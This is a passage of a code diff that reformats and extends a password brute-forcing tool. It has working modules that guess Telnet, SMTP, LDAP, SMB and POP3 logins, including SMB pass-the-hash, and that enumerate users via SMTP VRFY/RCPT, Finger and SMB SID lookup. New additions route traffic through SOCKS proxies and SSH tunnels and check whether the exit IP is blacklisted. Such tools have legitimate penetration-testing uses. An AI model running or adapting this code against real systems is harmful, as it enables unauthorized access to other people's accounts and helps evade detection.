+            index = ssh_tunnel.expect(['Address already in use', pexpect.TIMEOUT])
+            if index is 0:
+                ssh_tunnel.terminate()
+                local_port += 1
+                max_retries -= 1
+            else:
+                marker = False
 
-      logger.debug('No error')
-      code, mesg = '0', banner
+    return local_port, ssh_tunnel
 
-      self.reset()
 
-    except paramiko.AuthenticationException as e:
-      logger.debug('AuthenticationException: %s' % e)
-      code, mesg = '1', str(e)
+def we_are_frozen():
+    # All of the modules are built-in to the interpreter, e.g., by py2exe
+    return hasattr(sys, "frozen")
 
-    if persistent == '0':
-      self.reset()
 
-    return self.Response(code, mesg, timing)
+def module_path():
+    if we_are_frozen():
+        return os.path.dirname(sys.executable)
+    return os.path.dirname(__file__)
+
+
+# }}}
+
+# Web crawling tools {{{
+import scrapy
+from scrapy.crawler import CrawlerProcess
+from scrapy.http import Request
+
+
+class IPData(scrapy.Item):
+    country = scrapy.Field()
+    region = scrapy.Field()
+    city = scrapy.Field()
+    is_black = scrapy.Field()
+
+
+class WhoerSpider(scrapy.Spider):
+    name = 'whoer'
+    allowed_domains = ['whoer.net']
+
+    def __int__(self, proxy=None):
+        scrapy.Spider.__init__(self)
+        if proxy is not None:
+            self.proxy = proxy
+
+    def parse(self, responce):
+        item = IPData()
+        temp_data = responce.xpath('//tr/td[@class="wtr_z"]/text()').extract()
+        logger.debug('Temp data: %s' % str(temp_data))
+        item['country'] = temp_data[0][3:5]
+        if temp_data[1] == u'\n':
+            temp_data = responce.xpath('//tr/td[@class="wtr_z"]/span/text()').extract()
+            logger.debug('Temp data: %s' % str(temp_data))
+            item['city'] = temp_data[0]
+        else:
+            item['city'] = temp_data[1]
+        temp_data = responce.xpath('//tr/td[@class="wtr"]/text()').extract()
+        logger.debug('Temp data: %s' % str(temp_data))
+        if temp_data[3] == u'\xa0':
+            temp_data = responce.xpath('//tr/td[@class="wtr"]/span/text()').extract()
+            logger.debug('Temp data: %s' % str(temp_data))
+            item['region'] = temp_data[0]
+        else:
+            item['region'] = temp_data[3]
+        temp_data = responce.xpath('//tr/td/a/span/text()').extract()
+        if len(temp_data) is 0:
+            temp_data = responce.xpath('//tr/td/a/span/text()').extract()
+            logger.debug('Temp data: %s' % str(temp_data))
+            item['is_black'] = temp_data[0][1:]
+        else:
+            temp_data = responce.xpath('//tr/td[@class="wtr"]/text()').extract()
+            logger.debug('Temp data: %s' % str(temp_data))
+            item['is_black'] = temp_data[9][1:].strip('\n')
+        logger.debug('IP Data: %s' % str(item))
+        return item
+
+    def start_requests(self):
+        if self.proxy is not None:
+            yield Request('http://whoer.net/?lang=en',
+                          meta={'proxy': 'http://%s' % self.proxy})
+        else:
+            yield Request('http://whoer.net/?lang=en')
+
+
+from scrapy.core.downloader.handlers.http11 import HTTP11DownloadHandler, ScrapyAgent
+from scrapy.core.downloader.webclient import _parse
+from twisted.internet import reactor
+from scrapy.xlib.tx import TCP4ClientEndpoint
+from txsocksx.http import SOCKS5Agent
+
+
+class SocksProxyDownloadHandler(HTTP11DownloadHandler):
+    def download_request(self, request, spider):
+        """Return a deferred for the HTTP download"""
+        agent = ScrapySocksAgent(contextFactory=self._contextFactory, pool=self._pool)
+        return agent.download_request(request)
+
+
+class ScrapySocksAgent(ScrapyAgent):
+    def _get_agent(self, request, timeout):
+        bindaddress = request.meta.get('bindaddress') or self._bindAddress
+        proxy = request.meta.get('proxy')
+        if proxy:
+            _, _, proxyHost, proxyPort, proxyParams = _parse(proxy)
+            scheme = _parse(request.url)[0]
+            omitConnectTunnel = proxyParams.find('noconnect') >= 0
+            if scheme == 'https' and not omitConnectTunnel:
+                proxyConf = (proxyHost, proxyPort,
+                             request.headers.get('Proxy-Authorization', None))
+                return self._TunnelingAgent(reactor, proxyConf,
+                                            contextFactory=self._contextFactory, connectTimeout=timeout,
+                                            bindAddress=bindaddress, pool=self._pool)
+            else:
+                _, _, host, port, proxyParams = _parse(request.url)
+                proxyEndpoint = TCP4ClientEndpoint(reactor, proxyHost, proxyPort,
+                                                   timeout=timeout, bindAddress=bindaddress)
+                return SOCKS5Agent(reactor, proxyEndpoint=proxyEndpoint)
+
+        return self._Agent(reactor, contextFactory=self._contextFactory,
+                           connectTimeout=timeout, bindAddress=bindaddress, pool=self._pool)
+
 
 # }}}
 
 # Telnet {{{
 from telnetlib import Telnet
+
+
 class Telnet_login(TCP_Cache):
-  '''Brute-force Telnet'''
+    '''Brute-force Telnet'''
 
-  usage_hints = (
-    """%prog host=10.0.0.1 inputs='FILE0\\nFILE1' 0=logins.txt 1=passwords.txt persistent=0"""
-    """ prompt_re='Username:|Password:' -x ignore:egrep='Login incorrect.+Username:'""",
+    usage_hints = (
+        """%prog host=10.0.0.1 inputs='FILE0\\nFILE1' 0=logins.txt 1=passwords.txt persistent=0"""
+        """ prompt_re='Username:|Password:' -x ignore:egrep='Login incorrect.+Username:'""",
     )
 
-  available_options = (
-    ('host', 'target host'),
-    ('port', 'target port [23]'),
-    ('inputs', 'list of values to input'),
-    ('prompt_re', 'regular expression to match prompts [\w+:]'),
-    ('timeout', 'seconds to wait for a response and for prompt_re to match received data [20]'),
+    available_options = (
+        ('host', 'target host'),
+        ('port', 'target port [23]'),
+        ('inputs', 'list of values to input'),
+        ('prompt_re', 'regular expression to match prompts [\w+:]'),
+        ('timeout', 'seconds to wait for a response and for prompt_re to match received data [20]'),
     )
-  available_options += TCP_Cache.available_options
+    available_options += TCP_Cache.available_options
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def connect(self, host, port, timeout):
-    self.prompt_count = 0
-    fp = Telnet(host, int(port), int(timeout))
+    def connect(self, host, port, timeout):
+        self.prompt_count = 0
+        fp = Telnet(host, int(port), int(timeout))
 
-    return TCP_Connection(fp)
+        return TCP_Connection(fp)
 
-  def execute(self, host, port='23', inputs=None, prompt_re='\w+:', timeout='20', persistent='1'):
+    def execute(self, host, port='23', inputs=None, prompt_re='\w+:', timeout='20', persistent='1'):
 
-    with Timing() as timing:
-      fp, _ = self.bind(host, port, timeout=timeout)
+        with Timing() as timing:
+            fp, _ = self.bind(host, port, timeout=timeout)
 
-    trace = ''
-    timeout = int(timeout)
+        trace = ''
+        timeout = int(timeout)
 
-    if self.prompt_count == 0:
-      _, _, raw = fp.expect([prompt_re], timeout=timeout)
-      logger.debug('raw banner: %s' % repr(raw))
-      trace += raw
-      self.prompt_count += 1
-  
-    if inputs is not None:
-      with Timing() as timing:
-        for val in inputs.split(r'\n'):
-          logger.debug('input: %s' % val)
-          cmd = val + '\n' #'\r\x00'
-          fp.write(cmd)
-          trace += cmd
+        if self.prompt_count == 0:
+            _, _, raw = fp.expect([prompt_re], timeout=timeout)
+            logger.debug('raw banner: %s' % repr(raw))
+            trace += raw
+            self.prompt_count += 1
 
-          _, _, raw = fp.expect([prompt_re], timeout=timeout)
-          logger.debug('raw %d: %s' % (self.prompt_count, repr(raw)))
-          trace += raw
-          self.prompt_count += 1
+        if inputs is not None:
+            with Timing() as timing:
+                for val in inputs.split(r'\n'):
+                    logger.debug('input: %s' % val)
+                    cmd = val + '\n'  # '\r\x00'
+                    fp.write(cmd)
+                    trace += cmd
 
-    if persistent == '0':
-      self.reset()
+                    _, _, raw = fp.expect([prompt_re], timeout=timeout)
+                    logger.debug('raw %d: %s' % (self.prompt_count, repr(raw)))
+                    trace += raw
+                    self.prompt_count += 1
 
-    mesg = repr(raw)[1:-1] # strip enclosing single quotes
-    return self.Response(0, mesg, timing, trace)
+        if persistent == '0':
+            self.reset()
+
+        mesg = repr(raw)[1:-1]  # strip enclosing single quotes
+        return self.Response(0, mesg, timing, trace)
+
 
 # }}}
 
 # SMTP {{{
 from smtplib import SMTP, SMTP_SSL, SMTPAuthenticationError, SMTPHeloError, SMTPException
-class SMTP_Base(TCP_Cache):
 
-  available_options = TCP_Cache.available_options
-  available_options += (
-    ('timeout', 'seconds to wait for a response [10]'),
-    ('host', 'target host'),
-    ('port', 'target port [25]'),
-    ('ssl', 'use SSL [0|1]'),
-    ('helo', 'helo or ehlo command to send after connect [skip]'),
-    ('starttls', 'send STARTTLS [0|1]'),
-    ('user', 'usernames to test'),
+
+class SMTP_Base(TCP_Cache):
+    available_options = TCP_Cache.available_options
+    available_options += (
+        ('timeout', 'seconds to wait for a response [10]'),
+        ('host', 'target host'),
+        ('port', 'target port [25]'),
+        ('ssl', 'use SSL [0|1]'),
+        ('helo', 'helo or ehlo command to send after connect [skip]'),
+        ('starttls', 'send STARTTLS [0|1]'),
+        ('user', 'usernames to test'),
     )
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def connect(self, host, port, ssl, helo, starttls, timeout):
+    def connect(self, host, port, ssl, helo, starttls, timeout):
 
-    if ssl == '0':
-      if not port: port = 25
-      fp = SMTP(timeout=int(timeout))
-    else:
-      if not port: port = 465
-      fp = SMTP_SSL(timeout=int(timeout))
+        if ssl == '0':
+            if not port: port = 25
+            fp = SMTP(timeout=int(timeout))
+        else:
+            if not port: port = 465
+            fp = SMTP_SSL(timeout=int(timeout))
 
-    resp = fp.connect(host, int(port))
+        resp = fp.connect(host, int(port))
 
-    if helo:
-      cmd, name = helo.split(' ', 1)
-      
-      if cmd.lower() == 'ehlo':
-        resp = fp.ehlo(name)
-      else:
-        resp = fp.helo(name)
+        if helo:
+            cmd, name = helo.split(' ', 1)
 
-    if not starttls == '0':
-      resp = fp.starttls()
+            if cmd.lower() == 'ehlo':
+                resp = fp.ehlo(name)
+            else:
+                resp = fp.helo(name)
 
-    return TCP_Connection(fp, resp)
-    
+        if not starttls == '0':
+            resp = fp.starttls()
+
+        return TCP_Connection(fp, resp)
+
 
 class SMTP_vrfy(SMTP_Base):
-  '''Enumerate valid users using SMTP VRFY'''
+    '''Enumerate valid users using SMTP VRFY'''
 
-  usage_hints = (
-    '''%prog host=10.0.0.1 user=FILE0 0=logins.txt [helo='ehlo its.me.com']'''
-    ''' -x ignore:fgrep='User unknown' -x ignore,reset,retry:code=421''',
+    usage_hints = (
+        '''%prog host=10.0.0.1 user=FILE0 0=logins.txt [helo='ehlo its.me.com']'''
+        ''' -x ignore:fgrep='User unknown' -x ignore,reset,retry:code=421''',
     )
 
-  def execute(self, host, port='', ssl='0', helo='', starttls='0', user=None, timeout='10', persistent='1'):
+    def execute(self, host, port='', ssl='0', helo='', starttls='0', user=None, timeout='10', persistent='1'):
 
-    with Timing() as timing:
-      fp, resp = self.bind(host, port, ssl, helo, starttls, timeout=timeout)
+        with Timing() as timing:
+            fp, resp = self.bind(host, port, ssl, helo, starttls, timeout=timeout)
 
-    if user is not None:
-      with Timing() as timing:
-        resp = fp.verify(user)
+        if user is not None:
+            with Timing() as timing:
+                resp = fp.verify(user)
 
-    if persistent == '0':
-      self.reset()
+        if persistent == '0':
+            self.reset()
 
-    code, mesg = resp
-    return self.Response(code, mesg, timing)
+        code, mesg = resp
+        return self.Response(code, mesg, timing)
 
 
 class SMTP_rcpt(SMTP_Base):
-  '''Enumerate valid users using SMTP RCPT TO'''
+    '''Enumerate valid users using SMTP RCPT TO'''
 
-  usage_hints = (
-    '''%prog host=10.0.0.1 user=FILE0@localhost 0=logins.txt [helo='ehlo its.me.com']'''
-    ''' [mail_from=bar@example.com] -x ignore:fgrep='User unknown' -x ignore,reset,retry:code=421''',
+    usage_hints = (
+        '''%prog host=10.0.0.1 user=FILE0@localhost 0=logins.txt [helo='ehlo its.me.com']'''
+        ''' [mail_from=bar@example.com] -x ignore:fgrep='User unknown' -x ignore,reset,retry:code=421''',
     )
 
-  available_options = SMTP_Base.available_options
-  available_options += (
-    ('mail_from', 'sender email [test@example.org]'),
+    available_options = SMTP_Base.available_options
+    available_options += (
+        ('mail_from', 'sender email [test@example.org]'),
     )
 
-  def execute(self, host, port='', ssl='0', helo='', starttls='0', mail_from='test@example.org', user=None, timeout='10', persistent='1'):
+    def execute(self, host, port='', ssl='0', helo='', starttls='0', mail_from='test@example.org', user=None,
+                timeout='10', persistent='1'):
 
-    with Timing() as timing:
-      fp, resp = self.bind(host, port, ssl, helo, starttls, timeout=timeout)
+        with Timing() as timing:
+            fp, resp = self.bind(host, port, ssl, helo, starttls, timeout=timeout)
 
-    if mail_from or user is not None:
-      with Timing() as timing:
-        if mail_from:
-          resp = fp.mail(mail_from)
-        if user is not None:
-          resp = fp.rcpt(user)
+        if mail_from or user is not None:
+            with Timing() as timing:
+                if mail_from:
+                    resp = fp.mail(mail_from)
+                if user is not None:
+                    resp = fp.rcpt(user)
 
-    fp.rset()
+        fp.rset()
 
-    if persistent == '0':
-      self.reset()
+        if persistent == '0':
+            self.reset()
 
-    code, mesg = resp
-    return self.Response(code, mesg, timing)
+        code, mesg = resp
+        return self.Response(code, mesg, timing)
 
 
 class SMTP_login(SMTP_Base):
-  '''Brute-force SMTP'''
+    '''Brute-force SMTP'''
 
-  usage_hints = (
-    '''%prog host=10.0.0.1 user=f.bar@dom.com password=FILE0 0=passwords.txt [helo='ehlo its.me.com']'''
-    ''' -x ignore:fgrep='Authentication failed' -x ignore,reset,retry:code=421''',
+    usage_hints = (
+        '''%prog host=10.0.0.1 user=f.bar@dom.com password=FILE0 0=passwords.txt [helo='ehlo its.me.com']'''
+        ''' -x ignore:fgrep='Authentication failed' -x ignore,reset,retry:code=421''',
     )
 
-  available_options = SMTP_Base.available_options
-  available_options += (
-    ('password', 'passwords to test'),
+    available_options = SMTP_Base.available_options
+    available_options += (
+        ('password', 'passwords to test'),
     )
 
-  def execute(self, host, port='', ssl='0', helo='', starttls='0', user=None, password=None, timeout='10', persistent='1'):
+    def execute(self, host, port='', ssl='0', helo='', starttls='0', user=None, password=None, timeout='10',
+                persistent='1'):
 
-    with Timing() as timing:
-      fp, resp = self.bind(host, port, ssl, helo, starttls, timeout=timeout)
-    
-    try:
-      if user is not None and password is not None:
         with Timing() as timing:
-          resp = fp.login(user, password)
+            fp, resp = self.bind(host, port, ssl, helo, starttls, timeout=timeout)
 
-      logger.debug('No error: %s' % str(resp))
-      self.reset()
+        try:
+            if user is not None and password is not None:
+                with Timing() as timing:
+                    resp = fp.login(user, password)
 
-    except (SMTPHeloError,SMTPAuthenticationError,SMTPException) as resp:
-      logger.debug('SMTPError: %s' % str(resp))
+            logger.debug('No error: %s' % str(resp))
+            self.reset()
 
-    if persistent == '0':
-      self.reset()
+        except (SMTPHeloError, SMTPAuthenticationError, SMTPException) as resp:
+            logger.debug('SMTPError: %s' % str(resp))
 
-    code, mesg = resp
-    return self.Response(code, mesg, timing)
+        if persistent == '0':
+            self.reset()
+
+        code, mesg = resp
+        return self.Response(code, mesg, timing)
+
 
 # }}}
 
 # Finger {{{
 class Controller_Finger(Controller):
+    user_list = []
 
-  user_list = []
+    def push_final(self, resp):
+        if hasattr(resp, 'lines'):
+            for l in resp.lines:
+                if l not in self.user_list:
+                    self.user_list.append(l)
 
-  def push_final(self, resp):
-    if hasattr(resp, 'lines'):
-      for l in resp.lines:
-         if l not in self.user_list:
-           self.user_list.append(l)
+    def show_final(self):
+        print('\n'.join(self.user_list))
 
-  def show_final(self):
-    print('\n'.join(self.user_list))
 
 class Finger_lookup:
-  '''Enumerate valid users using Finger'''
+    '''Enumerate valid users using Finger'''
 
-  usage_hints = (
-    """%prog host=10.0.0.1 user=FILE0 0=words.txt -x ignore:fgrep='no such user'""",
+    usage_hints = (
+        """%prog host=10.0.0.1 user=FILE0 0=words.txt -x ignore:fgrep='no such user'""",
     )
 
-  available_options = (
-    ('host', 'target host'),
-    ('port', 'target port [79]'),
-    ('user', 'usernames to test'),
-    ('timeout', 'seconds to wait for a response [5]'),
+    available_options = (
+        ('host', 'target host'),
+        ('port', 'target port [79]'),
+        ('user', 'usernames to test'),
+        ('timeout', 'seconds to wait for a response [5]'),
     )
-  available_actions = ()
+    available_actions = ()
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def execute(self, host, port='79', user='', timeout='5'):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(int(timeout))
+    def execute(self, host, port='79', user='', timeout='5'):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(int(timeout))
 
-    with Timing() as timing:
-      s.connect((host, int(port)))
+        with Timing() as timing:
+            s.connect((host, int(port)))
 
-    if user:
-      s.send(user)
-    s.send('\r\n')
+        if user:
+            s.send(user)
+        s.send('\r\n')
 
-    data = ''
-    with Timing() as timing:
-      while True:
-        raw = s.recv(1024)
-        if not raw:
-          break
-        data += raw
+        data = ''
+        with Timing() as timing:
+            while True:
+                raw = s.recv(1024)
+                if not raw:
+                    break
+                data += raw
 
-    s.close()
+        s.close()
 
-    logger.debug('recv: %s' % repr(data))
+        logger.debug('recv: %s' % repr(data))
 
-    data = data.strip()
-    mesg = repr(data)
+        data = data.strip()
+        mesg = repr(data)
 
-    resp = self.Response(0, mesg, timing, data)
-    resp.lines = [l.strip('\r\n') for l in data.split('\n')]
+        resp = self.Response(0, mesg, timing, data)
+        resp.lines = [l.strip('\r\n') for l in data.split('\n')]
 
-    return resp
+        return resp
+
+
 # }}}
 
 # LDAP {{{
 if not which('ldapsearch'):
-  notfound.append('openldap')
+    notfound.append('openldap')
+
 
 # Because python-ldap-2.4.4 did not allow using a PasswordPolicyControl
 # during bind authentication (cf. http://article.gmane.org/gmane.comp.python.ldap/1003),
 # I chose to wrap around ldapsearch with "-e ppolicy".
 
 class LDAP_login:
-  '''Brute-force LDAP'''
+    '''Brute-force LDAP'''
 
-  usage_hints = (
-    """%prog host=10.0.0.1 binddn='cn=Directory Manager' bindpw=FILE0 0=passwords.txt"""
-    """ -x ignore:mesg='ldap_bind: Invalid credentials (49)'""",
+    usage_hints = (
+        """%prog host=10.0.0.1 binddn='cn=Directory Manager' bindpw=FILE0 0=passwords.txt"""
+        """ -x ignore:mesg='ldap_bind: Invalid credentials (49)'""",
     )
 
-  available_options = (
-    ('host', 'target host'),
-    ('port', 'target port [389]'),
-    ('binddn', 'usernames to test'),
-    ('bindpw', 'passwords to test'),
-    ('basedn', 'base DN for search'),
-    ('ssl', 'use SSL/TLS [0|1]'),
+    available_options = (
+        ('host', 'target host'),
+        ('port', 'target port [389]'),
+        ('binddn', 'usernames to test'),
+        ('bindpw', 'passwords to test'),
+        ('basedn', 'base DN for search'),
+        ('ssl', 'use SSL/TLS [0|1]'),
     )
-  available_actions = ()
+    available_actions = ()
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def execute(self, host, port='389', binddn='', bindpw='', basedn='', ssl='0'):
-    uri = 'ldap%s://%s:%s' % ('s' if ssl != '0' else '', host, port)
-    cmd = ['ldapsearch', '-H', uri, '-e', 'ppolicy', '-D', binddn, '-w', bindpw, '-b', basedn, '-s', 'one']
-    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env={'LDAPTLS_REQCERT': 'never'})
-    out = p.stdout.read()
-    err = p.stderr.read()
+    def execute(self, host, port='389', binddn='', bindpw='', basedn='', ssl='0'):
+        uri = 'ldap%s://%s:%s' % ('s' if ssl != '0' else '', host, port)
+        cmd = ['ldapsearch', '-H', uri, '-e', 'ppolicy', '-D', binddn, '-w', bindpw, '-b', basedn, '-s', 'one']
+        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env={'LDAPTLS_REQCERT': 'never'})
+        out = p.stdout.read()
+        err = p.stderr.read()
 
-    with Timing() as timing:
-      code = p.wait()
+        with Timing() as timing:
+            code = p.wait()
 
-    mesg = repr((out + err).strip())[1:-1]
-    trace = '[out]\n%s\n[err]\n%s' % (out, err)
+        mesg = repr((out + err).strip())[1:-1]
+        trace = '[out]\n%s\n[err]\n%s' % (out, err)
 
-    return self.Response(code, mesg, timing, trace)
+        return self.Response(code, mesg, timing, trace)
+
 
 # }}}
 
 # SMB {{{
 try:
-  from impacket.smbconnection import SMBConnection, SessionError
-  from impacket import nt_errors
-  from impacket.dcerpc.v5 import transport,  lsat, lsad
-  from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
-  from impacket.dcerpc.v5.samr import SID_NAME_USE
+    from impacket.smbconnection import SMBConnection, SessionError
+    from impacket import nt_errors
+    from impacket.dcerpc.v5 import transport, lsat, lsad
+    from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
+    from impacket.dcerpc.v5.samr import SID_NAME_USE
 except ImportError:
-  notfound.append('impacket')
+    notfound.append('impacket')
+
 
 class SMB_Connection(TCP_Connection):
+    def close(self):
+        self.fp.getSMBServer().get_socket().close()
 
-  def close(self):
-    self.fp.getSMBServer().get_socket().close()
 
 class Response_SMB(Response_Base):
-  indicatorsfmt = [('code', -8), ('size', -4), ('time', 6)]
+    indicatorsfmt = [('code', -8), ('size', -4), ('time', 6)]
+
 
 class SMB_login(TCP_Cache):
-  '''Brute-force SMB'''
+    '''Brute-force SMB'''
 
-  usage_hints = (
-    """%prog host=10.0.0.1 user=FILE0 password=FILE1 0=logins.txt 1=passwords.txt"""
-    """ -x ignore:fgrep='unknown user name or bad password'""",
+    usage_hints = (
+        """%prog host=10.0.0.1 user=FILE0 password=FILE1 0=logins.txt 1=passwords.txt"""
+        """ -x ignore:fgrep='unknown user name or bad password'""",
     )
-  
-  available_options = (
-    ('host', 'target host'),
-    ('port', 'target port [139]'),
-    ('user', 'usernames to test'),
-    ('password', 'passwords to test'),
-    ('password_hash', "LM/NT hashes to test, at least one hash must be provided ('lm:nt' or ':nt' or 'lm:')"),
-    ('domain', 'domain to test'),
+
+    available_options = (
+        ('host', 'target host'),
+        ('port', 'target port [139]'),
+        ('user', 'usernames to test'),
+        ('password', 'passwords to test'),
+        ('password_hash', "LM/NT hashes to test, at least one hash must be provided ('lm:nt' or ':nt' or 'lm:')"),
+        ('domain', 'domain to test'),
     )
-  available_options += TCP_Cache.available_options
+    available_options += TCP_Cache.available_options
 
-  Response = Response_SMB
+    Response = Response_SMB
 
-  def connect(self, host, port):
-    # if port == 445, impacket will use <host> instead of '*SMBSERVER' as the remote_name
-    fp = SMBConnection('*SMBSERVER', host, sess_port=int(port))
+    def connect(self, host, port):
+        # if port == 445, impacket will use <host> instead of '*SMBSERVER' as the remote_name
+        fp = SMBConnection('*SMBSERVER', host, sess_port=int(port))
 
-    return SMB_Connection(fp)
+        return SMB_Connection(fp)
 
-  def execute(self, host, port='139', user=None, password='', password_hash=None, domain='', persistent='1'):
+    def execute(self, host, port='139', user=None, password='', password_hash=None, domain='', persistent='1'):
 
-    with Timing() as timing:
-      fp, _ = self.bind(host, port)
-
-    try:
-      if user is None:
-        fp.login('', '') # retrieve workgroup/domain and computer name
-      else:
         with Timing() as timing:
-          if password_hash:
-            if ':' in password_hash:
-              lmhash, nthash = password_hash.split(':')
+            fp, _ = self.bind(host, port)
+
+        try:
+            if user is None:
+                fp.login('', '')  # retrieve workgroup/domain and computer name
             else:
-              lmhash, nthash = 'aad3b435b51404eeaad3b435b51404ee', password_hash
-            fp.login(user, '', domain, lmhash, nthash)
+                with Timing() as timing:
+                    if password_hash:
+                        if ':' in password_hash:
+                            lmhash, nthash = password_hash.split(':')
+                        else:
+                            lmhash, nthash = 'aad3b435b51404eeaad3b435b51404ee', password_hash
+                        fp.login(user, '', domain, lmhash, nthash)
 
-          else:
-            fp.login(user, password, domain)
+                    else:
+                        fp.login(user, password, domain)
 
-      logger.debug('No error')
-      code, mesg = '0', '%s\\%s (%s)' % (fp.getServerDomain(), fp.getServerName(), fp.getServerOS())
+            logger.debug('No error')
+            code, mesg = '0', '%s\\%s (%s)' % (fp.getServerDomain(), fp.getServerName(), fp.getServerOS())
 
-      self.reset()
+            self.reset()
 
-    except SessionError as e:
-      code = '%x' % e.getErrorCode()
-      mesg = nt_errors.ERROR_MESSAGES[e.getErrorCode()][0]
+        except SessionError as e:
+            code = '%x' % e.getErrorCode()
+            mesg = nt_errors.ERROR_MESSAGES[e.getErrorCode()][0]
 
-    if persistent == '0':
-      self.reset()
+        if persistent == '0':
+            self.reset()
 
-    return self.Response(code, mesg, timing)
+        return self.Response(code, mesg, timing)
+
 
 class DCE_Connection(TCP_Connection):
+    def __init__(self, fp, smbt):
+        self.smbt = smbt
+        TCP_Connection.__init__(self, fp)
 
-  def __init__(self, fp, smbt):
-    self.smbt = smbt
-    TCP_Connection.__init__(self, fp)
+    def close(self):
+        self.smbt.get_socket().close()
 
-  def close(self):
-    self.smbt.get_socket().close()
 
 # impacket/examples/lookupsid.py is much faster because it queries 1000 SIDs per packet
 class SMB_lookupsid(TCP_Cache):
-  '''Brute-force SMB SID-lookup'''
+    '''Brute-force SMB SID-lookup'''
 
-  usage_hints = (
-    '''%prog host=10.0.0.1 sid=S-1-5-21-1234567890-1234567890-1234567890 rid=RANGE0 0=int:500-2000 -x ignore:code=1''',
+    usage_hints = (
+        '''%prog host=10.0.0.1 sid=S-1-5-21-1234567890-1234567890-1234567890 rid=RANGE0 0=int:500-2000 -x ignore:code=1''',
     )
 
-  available_options = (
-    ('host', 'target host'),
-    ('port', 'target port [139]'),
-    ('sid', 'SID to test'),
-    ('rid', 'RID to test'),
-    ('user', 'username to use if auth required'),
-    ('password', 'password to use if auth required'),
+    available_options = (
+        ('host', 'target host'),
+        ('port', 'target port [139]'),
+        ('sid', 'SID to test'),
+        ('rid', 'RID to test'),
+        ('user', 'username to use if auth required'),
+        ('password', 'password to use if auth required'),
     )
-  available_options += TCP_Cache.available_options
+    available_options += TCP_Cache.available_options
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def connect(self, host, port, user, password, sid):
-    smbt = transport.SMBTransport(host, int(port), r'\lsarpc', user, password)
+    def connect(self, host, port, user, password, sid):
+        smbt = transport.SMBTransport(host, int(port), r'\lsarpc', user, password)
 
-    dce = smbt.get_dce_rpc()
-    dce.connect()
-    dce.bind(lsat.MSRPC_UUID_LSAT)
+        dce = smbt.get_dce_rpc()
+        dce.connect()
+        dce.bind(lsat.MSRPC_UUID_LSAT)
 
-    op2 = lsat.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
+        op2 = lsat.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
 
-    if sid is None:
-      res = lsad.hLsarQueryInformationPolicy2(dce, op2['PolicyHandle'], lsad.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)
-      sid = res['PolicyInformation']['PolicyAccountDomainInfo']['DomainSid'].formatCanonical()
+        if sid is None:
+            res = lsad.hLsarQueryInformationPolicy2(dce, op2['PolicyHandle'],
+                                                    lsad.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)
+            sid = res['PolicyInformation']['PolicyAccountDomainInfo']['DomainSid'].formatCanonical()
 
-    self.sid = sid
-    self.policy_handle = op2['PolicyHandle']
+        self.sid = sid
+        self.policy_handle = op2['PolicyHandle']
 
-    return DCE_Connection(dce, smbt)
+        return DCE_Connection(dce, smbt)
 
-  def execute(self, host, port='139', user='', password='', sid=None, rid=None, persistent='1'):
+    def execute(self, host, port='139', user='', password='', sid=None, rid=None, persistent='1'):
 
-    fp, _ = self.bind(host, port, user, password, sid)
+        fp, _ = self.bind(host, port, user, password, sid)
 
-    if rid:
-      sid = '%s-%s' % (self.sid, rid)
-    else:
-      sid = self.sid
+        if rid:
+            sid = '%s-%s' % (self.sid, rid)
+        else:
+            sid = self.sid
 
-    try:
-      res = lsat.hLsarLookupSids(fp, self.policy_handle, [sid], lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
+        try:
+            res = lsat.hLsarLookupSids(fp, self.policy_handle, [sid], lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
 
-      code, names = 0, []
-      for n, item in enumerate(res['TranslatedNames']['Names']):
-        names.append("%s\\%s (%s)" % (res['ReferencedDomains']['Domains'][item['DomainIndex']]['Name'], item['Name'], SID_NAME_USE.enumItems(item['Use']).name[7:]))
+            code, names = 0, []
+            for n, item in enumerate(res['TranslatedNames']['Names']):
+                names.append("%s\\%s (%s)" % (
+                    res['ReferencedDomains']['Domains'][item['DomainIndex']]['Name'], item['Name'],
+                    SID_NAME_USE.enumItems(item['Use']).name[7:]))
 
-    except lsat.DCERPCSessionError:
-      code, names = 1, ['unknown'] # STATUS_NONE_MAPPED
+        except lsat.DCERPCSessionError:
+            code, names = 1, ['unknown']  # STATUS_NONE_MAPPED
 
-    if persistent == '0':
-      self.reset()
+        if persistent == '0':
+            self.reset()
 
-    return self.Response(code, ', '.join(names))
+        return self.Response(code, ', '.join(names))
+
+
 # }}}
 
 # POP {{{
 from poplib import POP3, POP3_SSL, error_proto as pop_error
+
+
 class POP_Connection(TCP_Connection):
-  def close(self):
-    self.fp.quit()
+    def close(self):
+        self.fp.quit()
+
 
 class POP_login(TCP_Cache):
-  '''Brute-force POP3'''
+    '''Brute-force POP3'''
 
-  usage_hints = (
-    '''%prog host=10.0.0.1 user=FILE0 password=FILE1 0=logins.txt 1=passwords.txt -x ignore:code=-ERR''',
+    usage_hints = (
+        '''%prog host=10.0.0.1 user=FILE0 password=FILE1 0=logins.txt 1=passwords.txt -x ignore:code=-ERR''',
     )
 
-  available_options = (
-    ('host', 'target host'),
-    ('port', 'target port [110]'),
-    ('user', 'usernames to test'),
-    ('password', 'passwords to test'),
-    ('ssl', 'use SSL [0|1]'),
-    ('timeout', 'seconds to wait for a response [10]'),
+    available_options = (
+        ('host', 'target host'),
+        ('port', 'target port [110]'),
+        ('user', 'usernames to test'),
+        ('password', 'passwords to test'),
+        ('ssl', 'use SSL [0|1]'),
+        ('timeout', 'seconds to wait for a response [10]'),
     )
-  available_options += TCP_Cache.available_options
+    available_options += TCP_Cache.available_options
 
-  Response = Response_Base
+    Response = Response_Base
 
-  def connect(self, host, port, ssl, timeout):
-    if ssl == '0':
-      if not port: port = 110
